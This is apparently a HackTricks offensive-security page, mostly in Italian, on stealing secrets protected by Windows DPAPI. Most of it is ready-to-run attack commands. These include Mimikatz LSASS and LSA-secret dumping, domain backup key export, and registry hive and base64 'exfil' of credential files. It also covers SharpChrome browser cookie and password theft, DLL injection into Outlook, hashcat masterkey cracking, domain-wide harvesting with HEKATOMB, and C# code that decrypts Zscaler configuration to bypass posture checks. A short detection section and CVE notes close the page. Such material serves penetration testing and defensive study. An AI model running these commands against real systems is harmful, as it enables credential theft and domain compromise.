# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## What is DPAPI

La Data Protection API (DPAPI) è utilizzata principalmente nel sistema operativo Windows per la **crittografia simmetrica di chiavi private asimmetriche**, sfruttando come fonte di entropia i segreti dell'utente o del sistema. Questo approccio semplifica la crittografia per gli sviluppatori permettendo loro di cifrare dati usando una chiave derivata dai segreti di logon dell'utente o, per la crittografia di sistema, dai segreti di autenticazione del dominio del sistema, evitando così agli sviluppatori la gestione della protezione della chiave di crittografia.

Il modo più comune di usare DPAPI è tramite le funzioni **`CryptProtectData` e `CryptUnprotectData`**, che consentono alle applicazioni di criptare e decriptare dati in modo sicuro con la sessione del processo attualmente loggato. Questo significa che i dati cifrati possono essere decrittati solo dallo stesso utente o sistema che li ha cifrati.

Inoltre, queste funzioni accettano anche un parametro **`entropy`** che viene usato durante la crittografia e la decrittografia; pertanto, per decriptare qualcosa cifrato usando questo parametro, è necessario fornire lo stesso valore di entropy usato in fase di cifratura.

### Users key generation

DPAPI genera una chiave unica (chiamata **`pre-key`**) per ogni utente basata sulle loro credenziali. Questa chiave è derivata dalla password dell'utente e da altri fattori: l'algoritmo dipende dal tipo di utente ma alla fine è basato su SHA1. Per esempio, per gli utenti di dominio, **dipende dall'NTLM hash dell'utente**.

Questo è particolarmente interessante perché se un attacker può ottenere l'hash della password dell'utente, può:

- **Decriptare qualsiasi dato che è stato cifrato usando DPAPI** con la chiave di quell'utente senza bisogno di chiamare alcuna API
- Tentare di **crackare la password** offline cercando di generare la DPAPI key valida

Inoltre, ogni volta che un utente cripta dei dati usando DPAPI, viene generata una nuova **master key**. Questa master key è quella effettivamente usata per cifrare i dati. Ogni master key è identificata da un **GUID** (Globally Unique Identifier) che la identifica.

Le master keys sono memorizzate nella directory **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, dove `{SID}` è lo Security Identifier di quell'utente. La master key è memorizzata cifrata dalla **`pre-key`** dell'utente e anche da una **domain backup key** per il recupero (quindi la stessa chiave è memorizzata cifrata 2 volte con 2 metodi diversi).

Nota che la **domain key usata per cifrare la master key è sui domain controller e non cambia mai**, quindi se un attacker ha accesso al domain controller, può recuperare la domain backup key e decriptare le master keys di tutti gli utenti nel dominio.

I blob cifrati contengono il **GUID della master key** che è stata usata per cifrare i dati all'interno delle loro intestazioni.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Questo è come apparirà un insieme di Master Keys di un utente:

![](<../../images/image (1121).png>)

### Generazione della chiave Machine/System

Questa è la chiave usata dalla macchina per crittografare i dati. Si basa sul **DPAPI_SYSTEM LSA secret**, che è una chiave speciale a cui può accedere solo l'utente SYSTEM. Questa chiave viene usata per crittografare dati che devono essere accessibili dal sistema stesso, come credenziali a livello di macchina o segreti a livello di sistema.

Nota che queste chiavi **non hanno un backup di dominio** quindi sono accessibili solo localmente:

- **Mimikatz** può accedervi estraendo i segreti LSA usando il comando: `mimikatz lsadump::secrets`
- Il segreto è memorizzato nel registro, quindi un amministratore potrebbe **modificare le autorizzazioni DACL per accedervi**. Il percorso del registro è: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- È inoltre possibile l'estrazione offline dagli hive del registro. Per esempio, come amministratore sul target, salva gli hive ed esfiltrali:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Poi, sulla tua macchina di analisi, recupera il DPAPI_SYSTEM LSA secret dagli hives e usalo per decrittare i machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Dati protetti da DPAPI

Tra i dati personali protetti da DPAPI ci sono:

- Windows creds
- Password e dati di auto-completamento di Internet Explorer e Google Chrome
- Password di account e-mail e FTP interni per applicazioni come Outlook e Windows Mail
- Password per cartelle condivise, risorse, reti wireless e Windows Vault, incluse le chiavi di crittografia
- Password per connessioni remote desktop, .NET Passport e chiavi private per vari scopi di crittografia e autenticazione
- Password di rete gestite da Credential Manager e dati personali in applicazioni che usano CryptProtectData, come Skype, MSN messenger e altri
- Blob crittografati all'interno del registro
- ...

I dati di sistema protetti includono:
- Password Wifi
- Password delle attività pianificate
- ...

### Opzioni per l'estrazione della master key

- Se l'utente ha privilegi domain admin, può accedere alla **domain backup key** per decrittare tutte le master key degli utenti nel dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegi amministrativi locali, è possibile **accedere alla memoria di LSASS** per estrarre le chiavi master DPAPI di tutti gli utenti connessi e la chiave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se l'utente ha privilegi di amministratore locale, può accedere al **DPAPI_SYSTEM LSA secret** per decrittare le chiavi master della macchina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se è nota la password o l'hash NTLM dell'utente, puoi **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se sei all'interno di una sessione come l'utente, è possibile chiedere al DC la **backup key per decriptare le master keys usando RPC**. Se sei local admin e l'utente ha effettuato l'accesso, potresti **rubare il suo session token** per questo:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Elenca Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accesso ai dati crittografati DPAPI

### Trovare i dati DPAPI crittografati

I file comunemente **protetti** degli utenti si trovano in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Controlla anche sostituendo `\Roaming\` con `\Local\` nei percorsi sopra.

Esempi di enumerazione:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) può trovare blob DPAPI cifrati nel file system, nel registro e nei blob B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Nota che [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (dallo stesso repo) può essere usato per decrittare, usando DPAPI, dati sensibili come i cookie.

#### Chromium/Edge/Electron ricette rapide (SharpChrome)

- Utente corrente, decrittazione interattiva dei login/cookie salvati (funziona anche con Chrome 127+ app-bound cookies perché la chiave aggiuntiva viene risolta dal Credential Manager dell'utente quando viene eseguito in contesto utente):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Analisi offline quando hai solo i file. Per prima cosa estrai l'AES state key dal profilo "Local State" e poi usala per decrittare il cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage a livello di dominio/remoto quando si ha la DPAPI domain backup key (PVK) e admin sull'host target:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Se possiedi il prekey/credkey DPAPI di un utente (da LSASS), puoi saltare il password cracking e decrittare direttamente i dati del profilo:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Note
- Le versioni più recenti di Chrome/Edge possono memorizzare alcuni cookies usando la cifratura "App-Bound". La decrittazione offline di quei cookies specifici non è possibile senza la chiave app-bound aggiuntiva; esegui SharpChrome nel contesto dell'utente target per recuperarla automaticamente. Vedi il post sul blog di sicurezza di Chrome referenziato qui sotto.

### Chiavi di accesso e dati

- **Use SharpDPAPI** per ottenere credenziali dai file crittografati con DPAPI dalla sessione corrente:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Ottieni informazioni sulle credentials** come i dati crittografati e il guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Decifra una masterkey di un utente che richiede la **domain backup key** utilizzando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per masterkey decryption (nota come sia possibile usare `/rpc` per ottenere il domains backup key, `/password` per usare una plaintext password, o `/pvk` per specificare un DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt dei dati usando una masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione di `credentials|vaults|rdg|keepass|triage|blob|ps` (nota che è possibile usare `/rpc` per ottenere la chiave di backup del dominio, `/password` per usare una password in chiaro, `/pvk` per specificare un file della chiave privata di dominio DPAPI, `/unprotect` per usare la sessione dell'utente corrente...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Uso diretto di un DPAPI prekey/credkey (nessuna password necessaria)

Se puoi dumpare LSASS, Mimikatz spesso espone una per-logon DPAPI key che può essere usata per decrittare i masterkeys dell'utente senza conoscere la plaintext password. Passa questo valore direttamente al tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Decriptare alcuni dati usando **sessione utente corrente**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Decrittazione offline con Impacket dpapi.py

Se hai il SID e la password (o NT hash) dell'utente vittima, puoi decriptare i DPAPI masterkeys e i Credential Manager blobs completamente offline usando Impacket dpapi.py.

- Identifica gli artefatti su disco:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Se lo strumento di trasferimento file è instabile, codifica i file in base64 localmente e copia l'output:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Decripta la masterkey usando il SID dell'utente e la password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Usa la masterkey decrittata per decrittare il credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Questo flusso di lavoro spesso recupera le credenziali di dominio salvate dalle app che utilizzano Windows Credential Manager, incluse account amministrativi (es., `*_adm`).

---

### Gestione dell'entropia opzionale ("Third-party entropy")

Alcune applicazioni passano un valore aggiuntivo di **entropy** a `CryptProtectData`. Senza questo valore il blob non può essere decifrato, anche se il masterkey corretto è noto. Ottenere l'entropy è quindi essenziale quando si mirano credenziali protette in questo modo (es. Microsoft Outlook, alcuni client VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) è una DLL in user-mode che effettua hook sulle funzioni DPAPI all'interno del processo target e registra in modo trasparente qualsiasi entropy opzionale fornita. Eseguire EntropyCapture in modalità **DLL-injection** contro processi come `outlook.exe` o `vpnclient.exe` genererà un file che mappa ogni buffer di entropy al processo chiamante e al blob. L'entropy catturata può poi essere fornita a **SharpDPAPI** (`/entropy:`) o a **Mimikatz** (`/entropy:<file>`) per decifrare i dati.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking delle masterkey offline (Hashcat & DPAPISnoop)

Microsoft ha introdotto un formato di masterkey **context 3** a partire da Windows 10 v1607 (2016). `hashcat` v6.2.6 (dicembre 2023) ha aggiunto gli hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) e **22102** (context 3), consentendo il cracking accelerato via GPU delle password utente direttamente dal file masterkey. Gli attaccanti possono quindi eseguire attacchi con word-list o brute-force senza interagire con il sistema target.

`DPAPISnoop` (2024) automatizza il processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Lo strumento può anche analizzare i blob Credential e Vault, decrittarli con chiavi crackate ed esportare le password in chiaro.

### Accedere ai dati di un'altra macchina

In **SharpDPAPI and SharpChrome** puoi utilizzare l'opzione **`/server:HOST`** per accedere ai dati di una macchina remota. Ovviamente devi poter accedere a quella macchina e nell'esempio seguente si assume che la **chiave di cifratura di backup del dominio sia nota**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Altri strumenti

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) è uno strumento che automatizza l'estrazione di tutti gli utenti e computer dalla directory LDAP e l'estrazione della chiave di backup del domain controller tramite RPC. Lo script risolverà poi gli indirizzi IP di tutti i computer ed eseguirà uno smbclient su tutti i computer per recuperare tutti i DPAPI blobs di tutti gli utenti e decriptare tutto con la chiave di backup del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con l'elenco dei computer estratto da LDAP puoi trovare ogni sottorete anche se non la conoscevi!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) può eseguire il dump dei segreti protetti da DPAPI automaticamente. La release 2.x ha introdotto:

* Raccolta parallela di blob da centinaia di host
* Parsing dei masterkey di **context 3** e integrazione con Hashcat per cracking automatico
* Supporto per cookie criptati "App-Bound" di Chrome (vedi sezione successiva)
* Una nuova modalità **`--snapshot`** per interrogare ripetutamente gli endpoint e fare il diff dei blob appena creati

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) è un parser in C# per file masterkey/credential/vault che può generare formati per Hashcat/JtR e opzionalmente avviare il cracking automaticamente. Supporta completamente i formati di masterkey macchina e utente fino a Windows 11 24H1.


## Rilevamenti comuni

- Accesso a file in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e altre directory correlate a DPAPI.
- Soprattutto da una condivisione di rete come **C$** o **ADMIN$**.
- Uso di **Mimikatz**, **SharpDPAPI** o tool simili per accedere alla memoria LSASS o dump dei masterkey.
- Evento **4662**: *È stata eseguita un'operazione su un oggetto* – può essere correlato con l'accesso all'oggetto **`BCKUPKEY`**.
- Evento **4673/4674** quando un processo richiede *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilità e cambiamenti nell'ecosistema 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembre 2023). Un attaccante con accesso alla rete poteva indurre un membro del dominio a recuperare una chiave di backup DPAPI malevola, permettendo la decrittazione dei masterkey utente. Corretto nell'aggiornamento cumulativo di novembre 2023 – gli amministratori dovrebbero assicurarsi che DC e workstation siano completamente aggiornati.
* **Chrome 127 “App-Bound” cookie encryption** (luglio 2024) ha sostituito la protezione legacy basata solo su DPAPI con una chiave aggiuntiva memorizzata nel **Credential Manager** dell'utente. La decrittazione offline dei cookie ora richiede sia il DPAPI masterkey che la **GCM-wrapped app-bound key**. SharpChrome v2.3 e DonPAPI 2.x sono in grado di recuperare la chiave extra quando eseguiti con contesto utente.


### Caso di studio: Zscaler Client Connector – Entropia personalizzata derivata dal SID

Zscaler Client Connector memorizza diversi file di configurazione in `C:\ProgramData\Zscaler` (es. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Ogni file è criptato con **DPAPI (Machine scope)** ma il vendor fornisce una **custom entropy** che viene *calcolata a runtime* invece di essere memorizzata su disco.

L'entropia viene ricostruita da due elementi:

1. Un segreto hard-coded incorporato in `ZSACredentialProvider.dll`.
2. Il **SID** dell'account Windows a cui appartiene la configurazione.

L'algoritmo implementato dalla DLL è equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Poiché il segreto è incorporato in una DLL che può essere letta dal disco, **qualsiasi attaccante locale con diritti SYSTEM può rigenerare l'entropia per qualsiasi SID** e decrittare i blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
La decrittazione restituisce la configurazione JSON completa, inclusi tutti i **device posture check** e il relativo valore previsto – informazioni molto preziose quando si tentano bypass lato client.

> SUGGERIMENTO: gli altri artefatti criptati (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sono protetti con DPAPI **senza** entropia (`16` byte a zero). Possono quindi essere decrittati direttamente con `ProtectedData.Unprotect` una volta ottenuti i privilegi SYSTEM.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
